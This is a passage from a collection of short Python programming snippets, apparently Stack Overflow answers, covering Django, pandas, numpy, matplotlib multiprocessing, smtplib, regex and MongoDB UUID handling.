model_ct = ContentType.objects.get(app_label="book", model="some_model_you_gonna_import")
target_model = model_ct.model_class()
</snippet></ROW><ROW><id>12026787</id><snippet>(model, operation)</snippet></ROW><ROW><id>12026787</id><snippet>@models_committed.connect_via(app)
def on_models_committed(sender, changes):
    for obj, change in changes:
        if change == 'delete' and hasattr(obj, '__commit_delete__'):
            obj.__commit_delete__()
</snippet></ROW><ROW><id>12026787</id><snippet>__commit_delete__(self)</snippet></ROW><ROW><id>12026787</id><snippet>after_delete</snippet></ROW><ROW><id>12026787</id><snippet>after_commit</snippet></ROW><ROW><id>12026789</id><snippet>def gt(lst, n):
    return max(lst) &gt; n
</snippet></ROW><ROW><id>12026815</id><snippet> def unset_session(self):
        """Removes a user from the session and invalidates the auth token."""
        self._user = None
        data = self.get_session_data(pop=True)
        ....
</snippet></ROW><ROW><id>12026815</id><snippet>   counter = self.session.get('counter')
    if not counter:
        counter = 0
    counter += 1

    if counter &gt; 5:
        self.session.pop('counter')
    else:
        self.session['counter'] = counter

    return self.response.write ( counter )
</snippet></ROW><ROW><id>12027393</id><snippet>import matplotlib.pyplot as plt

import multiprocessing


def do_plot(y_pos):
    fig = plt.figure()
    ax = plt.axes()
    ax.axhline(y_pos)
    fig.savefig('%s.pdf' % y_pos)

pool = multiprocessing.Pool()

for i in xrange(40):
    pool.apply_async(do_plot, [i])

pool.close()
pool.join()
</snippet></ROW><ROW><id>12027393</id><snippet>$&gt; time python multi_pool_1.py 
done

real    0m5.218s
user    0m4.901s
sys 0m0.205s

$&gt; time python multi_pool_n.py 
done

real    0m2.935s
user    0m9.022s
sys 0m0.420s
</snippet></ROW><ROW><id>12027456</id><snippet>sitemap = {'section_one': [0, {}],
           'section_two': [1, {'c_sect_2_1': [10, {}],
                               'c_sect_2_2': [11, {'c_sect_2_2_1': [110, {}],
                                                   'c_sect_2_2_2': [111, {}],
                                                   'c_sect_2_2_3': [112, {}]}],
                               'c_sect_2_3': [12, {}],
                               'c_sect_2_4': [13, {}]}],
           'section_three': [2, {}],
           'section_four': [3, {}],
           'section_five': [4, {}]}
</snippet></ROW><ROW><id>12027456</id><snippet>flat_sitemap = { 
    'section_one': 0,
    'section_two': 1,
    'section_two/c_sect_2_1': 10,
       # ...
    'section_two/c_sect_2_2/c_sect_2_2_1': 110
       # ...
    }
</snippet></ROW><ROW><id>12027456</id><snippet>O(1)</snippet></ROW><ROW><id>12027456</id><snippet>sitemap</snippet></ROW><ROW><id>12027456</id><snippet>def map_url(url, sm=[None, sitemap]):
    if not url: return sm[0]
    if url[0] not in sm[1]: return False
    return map_url(url[1:], sm[1][url[0]])

print map_url(['section_two', 'c_sect_2_2', 'c_sect_2_2_3']) # =&gt; 112
print map_url(['section_two', 'c_sect_2_2'])                 # =&gt; 10
print map_url(['section_two', 'notexisting'])                # =&gt; False
print map_url([])                                            # =&gt; None
</snippet></ROW><ROW><id>12027456</id><snippet>KeyError</snippet></ROW><ROW><id>12027516</id><snippet>    ...
    yield Request(..., errback=lambda failure, item=item: self.on_error(failure, item))

def on_error(self, failure, item):
    ...
</snippet></ROW><ROW><id>12027521</id><snippet>op.popen</snippet></ROW><ROW><id>12027521</id><snippet>splitlines</snippet></ROW><ROW><id>12027521</id><snippet>split</snippet></ROW><ROW><id>12027521</id><snippet>df -Ph</snippet></ROW><ROW><id>12027521</id><snippet>df -h</snippet></ROW><ROW><id>12027521</id><snippet>df_output_lines = [s.split() for s in os.popen("df -Ph").read().splitlines()]
</snippet></ROW><ROW><id>12027521</id><snippet>[line[0] for line in df_output_lines]</snippet></ROW><ROW><id>12027521</id><snippet>df_output_lines[1:]</snippet></ROW><ROW><id>12027521</id><snippet>df_output_lines</snippet></ROW><ROW><id>12027521</id><snippet>df -h</snippet></ROW><ROW><id>12027521</id><snippet>fixed_df_output = re.sub('\n\s+', ' ', raw_df_output.read())
df_output_lines = [s.split() for s in fixed_df_output.splitlines()]
</snippet></ROW><ROW><id>12027521</id><snippet>df</snippet></ROW><ROW><id>12027521</id><snippet>df -P</snippet></ROW><ROW><id>12027521</id><snippet>os.statvfs</snippet></ROW><ROW><id>12027521</id><snippet>df</snippet></ROW><ROW><id>12027584</id><snippet>self.aa = aa,
</snippet></ROW><ROW><id>12027694</id><snippet>result = re.sub(r"(margin|padding): ([^;]+?)(?:\s+\2)+;", r"\1: \2;", subject)
</snippet></ROW><ROW><id>12027694</id><snippet>margin:</snippet></ROW><ROW><id>12027694</id><snippet>padding:</snippet></ROW><ROW><id>12027694</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; subject = """margin: 10px 10px 10px 10px;
... margin: 10px 20px 10px 20px;
... padding: 10px 20px 10px 20px;
... padding: 10px 10px 10px;"""
&gt;&gt;&gt; result = re.sub(r"(margin|padding): ([^;]+?)(?:\s+\2)+;", r"\1: \2;", subject)
&gt;&gt;&gt; print(result)
margin: 10px;
margin: 10px 20px;
padding: 10px 20px;
padding: 10px;
</snippet></ROW><ROW><id>12027872</id><snippet>contour_levels = arange(-3, 3, 0.05)

fig, ax = subplots(subplot_kw=dict(projection='polar'))
cax = ax.contourf(thetas, r, values, contour_levels)
cb1 = fig.colorbar(cax)
</snippet></ROW><ROW><id>12027968</id><snippet>executemany()</snippet></ROW><ROW><id>12028229</id><snippet>sets</snippet></ROW><ROW><id>12028229</id><snippet>set</snippet></ROW><ROW><id>12028229</id><snippet>mySet = set()
</snippet></ROW><ROW><id>12028260</id><snippet>runserver</snippet></ROW><ROW><id>12028260</id><snippet>sys.argv</snippet></ROW><ROW><id>12028260</id><snippet>DEBUG</snippet></ROW><ROW><id>12028260</id><snippet>settings.py</snippet></ROW><ROW><id>12028260</id><snippet>DEBUG = (sys.argv[1] == 'runserver')
</snippet></ROW><ROW><id>12028260</id><snippet>import sys</snippet></ROW><ROW><id>12028260</id><snippet>settings.py</snippet></ROW><ROW><id>12028318</id><snippet>items_by_customer = {}

for item in ItemToBill.objects.filter(...date_query...):
    items_by_customer.setdefault(item.customerToBill, []).append(item)

for customer, items in items_by_customer.items():
    print customer, items # items grouped by customer.
    # generate_invoice(customer, items)
</snippet></ROW><ROW><id>12028399</id><snippet>import os
def getpage(fname, pageindex, pagesize=100, ahead=20):
    """read page roughly by byte size"""
    size = os.path.getsize(fname)
    pagenum = size/pagesize
    f=open(fname,'r')
    pos=pageindex * pagesize
    #ahead some line
    pos -= ahead
    if pos &lt;0: 
        pos = 0
    f.seek(pos)
    f.readline()
    txt = f.read(pagesize)
    txt += f.readline()    
    return txt
</snippet></ROW><ROW><id>12028682</id><snippet>with</snippet></ROW><ROW><id>12028682</id><snippet>io.BytesIO</snippet></ROW><ROW><id>12028682</id><snippet>&gt;&gt;&gt; import io
&gt;&gt;&gt; with io.BytesIO(b"foo") as f: f.read()
b'foo'
</snippet></ROW><ROW><id>12028720</id><snippet>for i, each in enumerate(test_text):
    print each, test_text[i-5]
</snippet></ROW><ROW><id>12028720</id><snippet>test_text[-1]</snippet></ROW><ROW><id>12028720</id><snippet>i-5</snippet></ROW><ROW><id>12028727</id><snippet>var queryString = window.location.href.split('index.html?')[1];</snippet></ROW><ROW><id>12028727</id><snippet>src</snippet></ROW><ROW><id>12028729</id><snippet>str.rjust()</snippet></ROW><ROW><id>12028729</id><snippet>print '%-20s%20s' % ('foo', 'bar')
</snippet></ROW><ROW><id>12028778</id><snippet>print</snippet></ROW><ROW><id>12028778</id><snippet>f = open ('C:\\Users\\test\\Desktop\\test.txt','r')
data = f.read()
print(data)
f.close()
</snippet></ROW><ROW><id>12028980</id><snippet>inp</snippet></ROW><ROW><id>12028980</id><snippet>get_data</snippet></ROW><ROW><id>12028980</id><snippet>"|S8</snippet></ROW><ROW><id>12028980</id><snippet>np.genfromtxt</snippet></ROW><ROW><id>12028980</id><snippet>inp</snippet></ROW><ROW><id>12028980</id><snippet>inp.tolist()</snippet></ROW><ROW><id>12028980</id><snippet>datetime</snippet></ROW><ROW><id>12028980</id><snippet>np.genfromtxt</snippet></ROW><ROW><id>12028980</id><snippet>np.genfromtxt(csv_file,
              delimiter=",",
              dtype=None,
              names=True,
              converters={1:lambda d:datetime.strptime(d,"%d/%m/%y"),
                          2:lambda d:datetime.strptime(d,"%d/%m/%y")})
</snippet></ROW><ROW><id>12028980</id><snippet>names=True</snippet></ROW><ROW><id>12028980</id><snippet>ndarray</snippet></ROW><ROW><id>12028980</id><snippet>Person,Date1,Date2,Status</snippet></ROW><ROW><id>12028980</id><snippet>converters</snippet></ROW><ROW><id>12028980</id><snippet>datetime</snippet></ROW><ROW><id>12028980</id><snippet>dtype</snippet></ROW><ROW><id>12028980</id><snippet>np.genfromtxt</snippet></ROW><ROW><id>12028980</id><snippet>for</snippet></ROW><ROW><id>12028980</id><snippet>for (i, item) in enumerate(whatever)</snippet></ROW><ROW><id>12028981</id><snippet>char const* greet()
{
   return "hello, world";
}

#include &lt;boost/python.hpp&gt;

BOOST_PYTHON_MODULE(hello_ext)
{
    using namespace boost::python;
    def("greet", greet);
}
</snippet></ROW><ROW><id>12028981</id><snippet>&gt;&gt;&gt; import hello_ext
&gt;&gt;&gt; print hello_ext.greet()
hello, world
</snippet></ROW><ROW><id>12029220</id><snippet>/home/wayne/programming/somesite/static
</snippet></ROW><ROW><id>12029220</id><snippet>/home/wayne/programming/somesite/yourapp/static
</snippet></ROW><ROW><id>12029220</id><snippet>STATIC_ROOT</snippet></ROW><ROW><id>12029220</id><snippet>manage.py collectstatic</snippet></ROW><ROW><id>12029220</id><snippet>collectstatic</snippet></ROW><ROW><id>12029220</id><snippet>STATIC_ROOT</snippet></ROW><ROW><id>12029220</id><snippet>STATICFILES_DIRS</snippet></ROW><ROW><id>12029220</id><snippet>/home/wayne/programming/somesite/static/styles
/home/wayne/programming/somesite/static/admin
</snippet></ROW><ROW><id>12029220</id><snippet>{% static "styles/main.css" %}</snippet></ROW><ROW><id>12029220</id><snippet>/home/wayne/programming/somesite/static/styles/styles/main.css
/home/wayne/programming/somesite/static/admin/styles/main.css
</snippet></ROW><ROW><id>12029220</id><snippet>STATICFILES_DIRS = ('/home/wayne/programming/somesite/static',)
</snippet></ROW><ROW><id>12029220</id><snippet>django.contrib.staticfiles.finders.AppDirectoriesFinder</snippet></ROW><ROW><id>12029233</id><snippet>','.join(filter(None, (sheet.cell(n, i).value for i in (18, 19, 20))))
</snippet></ROW><ROW><id>12029233</id><snippet>(sheet.cell(n, i).value for i in (18, 19, 20))</snippet></ROW><ROW><id>12029233</id><snippet>list(…)</snippet></ROW><ROW><id>12029233</id><snippet>(18, 19, 20)</snippet></ROW><ROW><id>12029233</id><snippet>filter(None, iterable)</snippet></ROW><ROW><id>12029233</id><snippet>(x for x in iterable if x)</snippet></ROW><ROW><id>12029233</id><snippet>[sheet.cell(n,18).value, sheet.cell(n,19).value, sheet.cell(n,20).value]
</snippet></ROW><ROW><id>12029233</id><snippet>list((sheet.cell(n,18).value, …))</snippet></ROW><ROW><id>12029296</id><snippet>#!/usr/bin/env python</snippet></ROW><ROW><id>12029296</id><snippet>root_path = os.path.dirname(current_path)
self.path_modules = os.path.join(root_path,'modules')
</snippet></ROW><ROW><id>12029305</id><snippet>recs = db.GqlQuery('select content from FileHistory')
for rec in recs:
  print rec.key(), rec.content 
</snippet></ROW><ROW><id>12029316</id><snippet>create(**kwargs)</snippet></ROW><ROW><id>12029316</id><snippet>p = Person.objects.create(first_name="Bruce", last_name="Springsteen")
</snippet></ROW><ROW><id>12029316</id><snippet>p = Person(first_name="Bruce", last_name="Springsteen")
p.save(force_insert=True)
</snippet></ROW><ROW><id>12029440</id><snippet>send()</snippet></ROW><ROW><id>12029440</id><snippet>shutdown(SHUT_WR)</snippet></ROW><ROW><id>12029552</id><snippet>business_function</snippet></ROW><ROW><id>12029585</id><snippet>PCbuild\readme.txt</snippet></ROW><ROW><id>12029742</id><snippet>cd ~/Library/Application Support/Sublime Text 2/Packages/SublimeCodeIntel
git pull
</snippet></ROW><ROW><id>12029812</id><snippet>dns.exception.Timeout</snippet></ROW><ROW><id>12030095</id><snippet>&gt;&gt;&gt; ["%.2d" % i for i in range(16)]
['00', '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12',
 '13', '14', '15']
</snippet></ROW><ROW><id>12030095</id><snippet>&gt;&gt;&gt; str(3).zfill(2)
'03'
</snippet></ROW><ROW><id>12030095</id><snippet>&gt;&gt;&gt; "{0:02d}".format(3)
'03'
</snippet></ROW><ROW><id>12030102</id><snippet>wx.PySimpleApp</snippet></ROW><ROW><id>12030102</id><snippet>wx.App</snippet></ROW><ROW><id>12030102</id><snippet>OnInit</snippet></ROW><ROW><id>12030102</id><snippet>PySimpleApp</snippet></ROW><ROW><id>12030102</id><snippet>wx.App</snippet></ROW><ROW><id>12030102</id><snippet>OnInit</snippet></ROW><ROW><id>12030102</id><snippet>wx.InitAllImageHandlers</snippet></ROW><ROW><id>12030102</id><snippet>wx.PySimpleApp</snippet></ROW><ROW><id>12030189</id><snippet>logo = wx.StaticBitmap(self.panel, 1, wx_logo)
</snippet></ROW><ROW><id>12030201</id><snippet>server = smtplib.SMTP('smtp.gmail.com', 587)
</snippet></ROW><ROW><id>12030201</id><snippet>server.starttls()</snippet></ROW><ROW><id>12030201</id><snippet>server = smtplib.SMTP()
server.connect("smtp.gmail.com", "submission")
server.starttls()
server.ehlo()
server.login(user, password)
</snippet></ROW><ROW><id>12030230</id><snippet>datetime.date.today()</snippet></ROW><ROW><id>12030230</id><snippet>datetime.datetime.now().date()</snippet></ROW><ROW><id>12030230</id><snippet>datetime.datetime.now().time()</snippet></ROW><ROW><id>12030230</id><snippet>DateTimeField</snippet></ROW><ROW><id>12030230</id><snippet>.date()</snippet></ROW><ROW><id>12030230</id><snippet>.time()</snippet></ROW><ROW><id>12030246</id><snippet>    # Now we'll create a mask in a bit of an easier way, by picking a
    # colour in the image that is to be the transparent colour.
    self.bmp_withcolourmask  = images.TestStar2.GetBitmap()
    mask = wx.Mask(self.bmp_withcolourmask, wx.WHITE)
    self.bmp_withcolourmask.SetMask(mask)
</snippet></ROW><ROW><id>12030421</id><snippet>import datetime
import commands
import time
import sys 

def main(argv):
  if len(argv) &lt; 2:
    sys.stderr.write("Usage: %s &lt;action&gt;" % (argv[0],))
    return 1
  output = commands.getoutput("ps -e")
  while argv[1] in output:
    output = commands.getoutput("ps -e")
    print argv[1], " running", datetime.datetime.now() 
    #it should be set depending upon the precision a user wants.
    time.sleep(5)
  sys.stderr.write("Process finished at %s\n" % datetime.datetime.now())

if __name__ == "__main__":
  sys.exit(main(sys.argv))
</snippet></ROW><ROW><id>12030465</id><snippet>&gt;&gt;&gt; from pandas import *
&gt;&gt;&gt; df = DataFrame({'A':['a','b','c'], 'B':['d','e','f'], 'C':['concat','me','yo'], 'D':['me','too','tambien']})
&gt;&gt;&gt; df
   A  B       C        D
0  a  d  concat       me
1  b  e      me      too
2  c  f      yo  tambien
&gt;&gt;&gt; df.columns[2:]
Index([C, D], dtype=object)
&gt;&gt;&gt; df[df.columns[2:]]
        C        D
0  concat       me
1      me      too
2      yo  tambien
&gt;&gt;&gt; [' '.join(row) for row in df[df.columns[2:]].values]
['concat me', 'me too', 'yo tambien']
&gt;&gt;&gt; df["new"] = [' '.join(row) for row in df[df.columns[2:]].values]
&gt;&gt;&gt; df
   A  B       C        D         new
0  a  d  concat       me   concat me
1  b  e      me      too      me too
2  c  f      yo  tambien  yo tambien
</snippet></ROW><ROW><id>12030465</id><snippet>None</snippet></ROW><ROW><id>12030465</id><snippet>&gt;&gt;&gt; df["C"][1] = None
&gt;&gt;&gt; df
   A  B       C        D
0  a  d  concat       me
1  b  e    None      too
2  c  f      yo  tambien
&gt;&gt;&gt; rows = df[df.columns[2:]].values
</snippet></ROW><ROW><id>12030465</id><snippet>&gt;&gt;&gt; new = [' '.join(word for word in row if word is not None) for row in rows]
&gt;&gt;&gt; new
['concat me', 'too', 'yo tambien']
</snippet></ROW><ROW><id>12030465</id><snippet>filter</snippet></ROW><ROW><id>12030465</id><snippet>&gt;&gt;&gt; new = [' '.join(filter(None, row)) for row in rows]
&gt;&gt;&gt; new
['concat me', 'too', 'yo tambien']
</snippet></ROW><ROW><id>12030602</id><snippet>    &lt;dict&gt;
        &lt;key&gt;captures&lt;/key&gt;
        &lt;dict&gt;
            &lt;key&gt;1&lt;/key&gt;
            &lt;dict&gt;
                &lt;key&gt;name&lt;/key&gt;
                &lt;string&gt;punctuation.whitespace.function-call.leading.python&lt;/string&gt;
            &lt;/dict&gt;
            &lt;key&gt;2&lt;/key&gt;
            &lt;dict&gt;
                &lt;key&gt;name&lt;/key&gt;
                &lt;string&gt;support.function.any-method.python&lt;/string&gt;
            &lt;/dict&gt;
            &lt;key&gt;3&lt;/key&gt;
            &lt;dict&gt;
                &lt;key&gt;name&lt;/key&gt;
                &lt;string&gt;punctuation.definition.parameters.python&lt;/string&gt;
            &lt;/dict&gt;
        &lt;/dict&gt;
        &lt;key&gt;match&lt;/key&gt;
        &lt;string&gt;(?x) (?: (?= \s )  (?:(?&lt;=else|new|return) | (?&lt;!\w)) (\s+))?
(\b
    (?!(while|for|do|if|else|switch|catch|enumerate|return|r?iterate|
        __import__|all|abs|any|apply|callable|chr|cmp|coerce|compile|delattr|dir|
        divmod|eval|execfile|filter|getattr|globals|hasattr|hash|hex|id|
        input|intern|isinstance|issubclass|iter|len|locals|map|max|min|oct|
        ord|pow|range|raw_input|reduce|reload|repr|round|setattr|sorted|
        sum|unichr|vars|zip|basestring|bool|buffer|classmethod|complex|dict|enumerate|file|
        float|frozenset|int|list|long|object|open|property|reversed|set|
        slice|staticmethod|str|super|tuple|type|unicode|xrange|
        abs|add|and|call|cmp|coerce|complex|contains|del|delattr|
        delete|delitem|delslice|div|divmod|enter|eq|exit|float|
        floordiv|ge|get|getattr|getattribute|getitem|getslice|gt|
        hash|hex|iadd|iand|idiv|ifloordiv|ilshift|imod|imul|init|
        int|invert|ior|ipow|irshift|isub|iter|itruediv|ixor|le|len|
        long|lshift|lt|mod|mul|ne|neg|new|nonzero|oct|or|pos|pow|
        radd|rand|rdiv|rdivmod|repr|rfloordiv|rlshift|rmod|rmul|ror|
        rpow|rrshift|rshift|rsub|rtruediv|rxor|set|setattr|setitem|
        setslice|str|sub|truediv|unicode|xor
    )\s*\()(?:(?!NS)[A-Za-z_][A-Za-z0-9_]*+\b | :: )++                  # actual name
)
 \s*(\()&lt;/string&gt;
        &lt;key&gt;name&lt;/key&gt;
        &lt;string&gt;meta.function-call.python&lt;/string&gt;
    &lt;/dict&gt;
</snippet></ROW><ROW><id>12030602</id><snippet>open</snippet></ROW><ROW><id>12030602</id><snippet>array</snippet></ROW><ROW><id>12030705</id><snippet>raise cherrypy.HTTPRedirect("/auth/login")</snippet></ROW><ROW><id>12030759</id><snippet>c:\Python27</snippet></ROW><ROW><id>12030759</id><snippet>c:\Python27\python</snippet></ROW><ROW><id>12030849</id><snippet>edit_person.html</snippet></ROW><ROW><id>12030849</id><snippet>PersonForm_NameOnly</snippet></ROW><ROW><id>12030849</id><snippet>edit_person_birthday</snippet></ROW><ROW><id>12030849</id><snippet>PersonForm_BirthdayOnly</snippet></ROW><ROW><id>12030849</id><snippet>edit_person_name</snippet></ROW><ROW><id>12030877</id><snippet>punkt</snippet></ROW><ROW><id>12030877</id><snippet>from nltk.tokenize.punkt import PunktSentenceTokenizer

def truncate_paragraph(text, maxnchars,
                       tokenize=PunktSentenceTokenizer().span_tokenize):
    """Truncate the text to at most maxnchars number of characters.

    The result contains only full sentences unless maxnchars is less
    than the first sentence length.
    """
    sentence_boundaries = tokenize(text)
    last = None
    for start_unused, end in sentence_boundaries:
        if end &gt; maxnchars:
            break
        last = end
    return text[:last] if last is not None else text[:maxnchars]
</snippet></ROW><ROW><id>12030877</id><snippet>text = ("This is the first sentence. This is the second sentence? "
        "This is the third\n sentence!")
for limit in [100, 80, 50, 5]:
    print(truncate_paragraph(text, limit))
</snippet></ROW><ROW><id>12030880</id><snippet>__main__</snippet></ROW><ROW><id>12030880</id><snippet>app</snippet></ROW><ROW><id>12030880</id><snippet>__main__</snippet></ROW><ROW><id>12030880</id><snippet>if __name__ == "__main__":</snippet></ROW><ROW><id>12030880</id><snippet>from app import app

if __name__ == "__main__":
    app.run()
</snippet></ROW><ROW><id>12030880</id><snippet>python run.py</snippet></ROW><ROW><id>12030917</id><snippet>def __init__(self,master):
    self.master=master
    Global()
</snippet></ROW><ROW><id>12030917</id><snippet>__init__</snippet></ROW><ROW><id>12030917</id><snippet>global f,f1,f2,enter,leave
</snippet></ROW><ROW><id>12030917</id><snippet>class Globals():
    f = tkFont.Font(name='f',size=14, weight='bold')
    f1 = tkFont.Font(name='f1',size=12, weight='bold')
    f2 = tkFont.Font(name='f2', underline=True,size=12, weight='bold')
</snippet></ROW><ROW><id>12030917</id><snippet> f = tkFont.Font(name='f',size=14, weight='bold')
 f1 = tkFont.Font(name='f1',size=12, weight='bold')
 f2 = tkFont.Font(name='f2', underline=True,size=12, weight='bold')
</snippet></ROW><ROW><id>12030917</id><snippet>global</snippet></ROW><ROW><id>12030917</id><snippet>self.pw_lbl = Label(...,f)
</snippet></ROW><ROW><id>12031026</id><snippet>super()</snippet></ROW><ROW><id>12031026</id><snippet>Parent</snippet></ROW><ROW><id>12031026</id><snippet>object</snippet></ROW><ROW><id>12031026</id><snippet>class Parent(object):
    def __init__(self):
        pass
    def Create(self):
        return 'Password'

class Child(Parent):
    def __init__(self):
        self.Create()
    def Create(self):
        return 'The ' + super(Child, self).Create()


print Child().Create() # prints "The Password"
</snippet></ROW><ROW><id>12031045</id><snippet>with open('C:/Comparison.txt', 'w') as f:
  json.dump(full_json, f)
</snippet></ROW><ROW><id>12031093</id><snippet>def set_extra_headers(self, path):
    self.set_header("Cache-control", "no-cache")
</snippet></ROW><ROW><id>12031115</id><snippet>Font.render</snippet></ROW><ROW><id>12031115</id><snippet>set_alpha</snippet></ROW><ROW><id>12031125</id><snippet>t.daemon = True
</snippet></ROW><ROW><id>12031125</id><snippet>event.set() # event occurred
</snippet></ROW><ROW><id>12031125</id><snippet>event.wait() # wait for event
</snippet></ROW><ROW><id>12031133</id><snippet>chest()</snippet></ROW><ROW><id>12031133</id><snippet>attack()</snippet></ROW><ROW><id>12031133</id><snippet>att</snippet></ROW><ROW><id>12031133</id><snippet>  att=lambda: random.randint(...),

 ...

      dmg = player['att']()
       ...
</snippet></ROW><ROW><id>12031157</id><snippet>Context</snippet></ROW><ROW><id>12031157</id><snippet>render_to_response()</snippet></ROW><ROW><id>12031157</id><snippet>HttpRequest</snippet></ROW><ROW><id>12031157</id><snippet>settings.py</snippet></ROW><ROW><id>12031157</id><snippet>render_to_response()</snippet></ROW><ROW><id>12031157</id><snippet>RequestContext</snippet></ROW><ROW><id>12031157</id><snippet>RequestContext</snippet></ROW><ROW><id>12031376</id><snippet>scipy.io.wavfile.read()</snippet></ROW><ROW><id>12031376</id><snippet>numpy.fromfile()</snippet></ROW><ROW><id>12031376</id><snippet>data = numpy.fromfile("test.pcm", dtype=np.int16)
</snippet></ROW><ROW><id>12031525</id><snippet>r_prev = r</snippet></ROW><ROW><id>12031525</id><snippet>r_prev = list(r)</snippet></ROW><ROW><id>12031574</id><snippet>uuid</snippet></ROW><ROW><id>12031574</id><snippet>UUID</snippet></ROW><ROW><id>12031574</id><snippet>5d78ad35ea5f11e1a183705681b29c47
5D78AD35EA5F11E1A183705681B29C47
5d78ad35ea5f11e1A183705681B29C47
</snippet></ROW><ROW><id>12031574</id><snippet>&gt; db.uuidsort.find().sort({_id:1})
{ "_id" : "5D78AD35EA5F11E1A183705681B29C47" }
{ "_id" : "5d78ad35ea5f11e1A183705681B29C47" }
{ "_id" : "5d78ad35ea5f11e1a183705681b29c47" }
</snippet></ROW><ROW><id>12031574</id><snippet>&gt; db.uuidtest.find()
{ "_id" : BinData(3,"XXitNepfEeGhg3BWgbKcRw==") }
{ "_id" : "5d78ad35ea5f11e1a183705681b29c47" }

&gt; Object.bsonsize(db.uuidtest.findOne({_id: BinData(3,"XXitNepfEeGhg3BWgbKcRw==")}))
31

&gt; Object.bsonsize(db.uuidtest.findOne({_id: "5d78ad35ea5f11e1a183705681b29c47"}))
47
</snippet></ROW><ROW><id>12031574</id><snippet>&gt;&gt;&gt; db.uuidtest.insert({'_id': uuid.hex})
'5d78ad35ea5f11e1a183705681b29c47'
</snippet></ROW><ROW><id>12031574</id><snippet>&gt;&gt;&gt; db.uuidtest.find_one({'_id':uuid.UUID('5d78ad35ea5f11e1a183705681b29c47')})
{u'_id': UUID('5d78ad35-ea5f-11e1-a183-705681b29c47')}
</snippet></ROW><ROW><id>12031574</id><snippet>mongo</snippet></ROW><ROW><id>12031574</id><snippet>UUID()</snippet></ROW><ROW><id>12031574</id><snippet>&gt; db.uuidtest.find({_id:UUID('5d78ad35ea5f11e1a183705681b29c47')})
{ "_id" : BinData(3,"XXitNepfEeGhg3BWgbKcRw==") }
</snippet></ROW><ROW><id>12031593</id><snippet>for p in primes:
  if p &gt; n:
    break
   ...
</snippet></ROW><ROW><id>12031593</id><snippet>for p in (x for x in primes if x &lt;= n):
   ...
</snippet></ROW><ROW><id>12031630</id><snippet>&gt;&gt;&gt; from datetime import datetime
&gt;&gt;&gt; datetime.strptime('30DEC05', '%d%b%y')
datetime.datetime(2005, 12, 30, 0, 0)
</snippet></ROW><ROW><id>12031630</id><snippet>%b</snippet></ROW><ROW><id>12031685</id><snippet>some_name = ...</snippet></ROW><ROW><id>12031685</id><snippet>global</snippet></ROW><ROW><id>12031685</id><snippet>nonlocal</snippet></ROW><ROW><id>12031685</id><snippet>self.foo = 1</snippet></ROW><ROW><id>12031685</id><snippet>foo</snippet></ROW><ROW><id>12031685</id><snippet>self</snippet></ROW><ROW><id>12031685</id><snippet>self</snippet></ROW><ROW><id>12031685</id><snippet>perimeter = 0</snippet></ROW><ROW><id>12031685</id><snippet>perimeter</snippet></ROW><ROW><id>12031685</id><snippet>Polygon</snippet></ROW><ROW><id>12031685</id><snippet>perimeter</snippet></ROW><ROW><id>12031685</id><snippet>perimeter = 0</snippet></ROW><ROW><id>12031685</id><snippet>__init__</snippet></ROW><ROW><id>12031685</id><snippet>add_point</snippet></ROW><ROW><id>12031685</id><snippet>perimeter</snippet></ROW><ROW><id>12031685</id><snippet>Polygon</snippet></ROW><ROW><id>12031685</id><snippet>def</snippet></ROW><ROW><id>12031685</id><snippet>self.foo = 1</snippet></ROW><ROW><id>12031685</id><snippet>self</snippet></ROW><ROW><id>12031685</id><snippet>foo = 1</snippet></ROW><ROW><id>12031685</id><snippet>foo = 1</snippet></ROW><ROW><id>12031685</id><snippet>foo.bar.baz = 1</snippet></ROW><ROW><id>12031685</id><snippet>foo = 1</snippet></ROW><ROW><id>12031752</id><snippet>list</snippet></ROW><ROW><id>12031752</id><snippet>&gt;&gt;&gt; d = {'10': -10, 'ZT21': 14, 'WX21': 12, '2': 15, '5': -3, 'UM': -25}
&gt;&gt;&gt; keyorder = ['ZT21', '10', 'WX21', 'UM', '5', '2']
&gt;&gt;&gt; sorted(d.items(), key=lambda i:keyorder.index(i[0]))
[('ZT21', 14), ('10', -10), ('WX21', 12), ('UM', -25), ('5', -3), ('2', 15)]
</snippet></ROW><ROW><id>12031752</id><snippet>&gt;&gt;&gt; from collections import OrderedDict
&gt;&gt;&gt; OrderedDict(sorted(d.items(), key=lambda i:keyorder.index(i[0])))
OrderedDict([('ZT21', 14), ('10', -10), ('WX21', 12), ('UM', -25), ('5', -3), ('2', 15)])
</snippet></ROW><ROW><id>12031752</id><snippet>dict</snippet></ROW><ROW><id>12031752</id><snippet>&gt;&gt;&gt; keyorder = {k:v for v,k in enumerate(['ZT21', '10', 'WX21', 'UM', '5', '2'])}
&gt;&gt;&gt; OrderedDict(sorted(d.items(), key=lambda i:keyorder.get(i[0])))
OrderedDict([('ZT21', 14), ('10', -10), ('WX21', 12), ('UM', -25), ('5', -3), ('2', 15)])
</snippet></ROW><ROW><id>12031792</id><snippet>cur.execute("SELECT * FROM %s" % (total[0],))
</snippet></ROW><ROW><id>12031894</id><snippet>__dict__</snippet></ROW><ROW><id>12031894</id><snippet>__dict__</snippet></ROW><ROW><id>12031894</id><snippet>&gt;&gt;&gt; class MyClass(object):
...       a_member = 'a'
...
&gt;&gt;&gt; o = MyClass()
&gt;&gt;&gt; p = MyClass()
&gt;&gt;&gt; o.a_member
'a'
&gt;&gt;&gt; p.a_member
'a'
&gt;&gt;&gt; o.a_member = 'b'
&gt;&gt;&gt; p.a_member
'a'
</snippet></ROW><ROW><id>12031894</id><snippet>MyClass.__dict__['a_member'] = 'a'</snippet></ROW><ROW><id>12031894</id><snippet>o.a_member</snippet></ROW><ROW><id>12031894</id><snippet>o.__dict__['a_member'] = 'b'</snippet></ROW><ROW><id>12031894</id><snippet>p.__dict__</snippet></ROW><ROW><id>12031894</id><snippet>a_member</snippet></ROW><ROW><id>12031894</id><snippet>MyClass.a_member</snippet></ROW><ROW><id>12031894</id><snippet>o</snippet></ROW><ROW><id>12031894</id><snippet>p</snippet></ROW><ROW><id>12031894</id><snippet>MyClass</snippet></ROW><ROW><id>12032047</id><snippet>from string import ascii_lowercase</snippet></ROW><ROW><id>12032112</id><snippet>f= open(trg_file, "w")</snippet></ROW><ROW><id>12032112</id><snippet>f= open(trg_file, "wb")</snippet></ROW><ROW><id>12032112</id><snippet>b</snippet></ROW><ROW><id>12032177</id><snippet>unichr()</snippet></ROW><ROW><id>12032177</id><snippet>&gt;&gt;&gt; unichr(10)
u'\n'
&gt;&gt;&gt; u'\u000a'
u'\n'
</snippet></ROW><ROW><id>12032202</id><snippet>import itertools

for a,b,c in itertools.product(cc1, cc2, cc3):
